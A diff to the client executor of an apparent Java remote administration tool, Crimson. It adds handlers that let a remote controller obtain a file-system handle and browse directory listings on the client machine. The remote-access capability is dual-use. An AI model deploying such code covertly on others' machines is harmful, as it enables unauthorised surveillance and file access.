@@ -17,19 +17,24 @@
  *****************************************************************************/
 package com.subterranean_security.crimson.client.net;
 
+import java.io.IOException;
 import java.util.concurrent.TimeUnit;
 
 import org.slf4j.Logger;
 
 import com.subterranean_security.crimson.client.Client;
+import com.subterranean_security.crimson.client.ClientStore;
 import com.subterranean_security.crimson.client.stream.CInfoSlave;
 import com.subterranean_security.crimson.core.Common;
+import com.subterranean_security.crimson.core.fm.LocalFilesystem;
 import com.subterranean_security.crimson.core.net.BasicExecutor;
 import com.subterranean_security.crimson.core.net.ConnectionState;
 import com.subterranean_security.crimson.core.proto.ClientAuth.Group;
 import com.subterranean_security.crimson.core.proto.ClientAuth.MI_GroupChallengeResult;
 import com.subterranean_security.crimson.core.proto.ClientAuth.RQ_GroupChallenge;
 import com.subterranean_security.crimson.core.proto.ClientAuth.RS_GroupChallenge;
+import com.subterranean_security.crimson.core.proto.FileManager.RQ_FileListing;
+import com.subterranean_security.crimson.core.proto.FileManager.RS_FileHandle;
 import com.subterranean_security.crimson.core.proto.FileManager.RS_FileListing;
 import com.subterranean_security.crimson.core.proto.MSG.Message;
 import com.subterranean_security.crimson.core.proto.Stream.Param;
@@ -87,6 +92,8 @@ public class ClientExecutor extends BasicExecutor {
 						stream_stop_ev(m);
 					} else if (m.hasRqChangeClientState()) {
 						rq_change_client_state(m);
+					} else if (m.hasRqFileHandle()) {
+						rq_file_handle(m);
 					} else {
 						connector.cq.put(m.getId(), m);
 					}
@@ -205,8 +212,28 @@ public class ClientExecutor extends BasicExecutor {
 
 	private void file_listing_rq(Message m) {
 
-		Client.connector.handle.write(Message.newBuilder()
-				.setRsFileListing(RS_FileListing.newBuilder().addAllListing(null)).setVid(m.getVid()).build());
+		RQ_FileListing rq = m.getRqFileListing();
+		log.debug("file_listing_rq. fmid: " + rq.getFmid());
+		LocalFilesystem lf = ClientStore.LocalFilesystems.get(rq.getFmid());
+		if (rq.hasUp() && rq.getUp()) {
+			lf.up();
+		} else if (rq.hasDown()) {
+			lf.down(rq.getDown());
+		}
+		try {
+			ClientRouter.route(Message.newBuilder().setId(m.getId())
+					.setRsFileListing(RS_FileListing.newBuilder().setPath(lf.pwd()).addAllListing(lf.list()))
+					.setSid(m.getRid()).setRid(m.getSid()));
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+	}
+
+	private void rq_file_handle(Message m) {
+		log.debug("rq_file_handle");
+		ClientRouter.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(m.getRid()).setRsFileHandle(
+				RS_FileHandle.newBuilder().setFmid(ClientStore.LocalFilesystems.add(new LocalFilesystem()))));
 	}
 
 	private void assign_1w(Message m) {
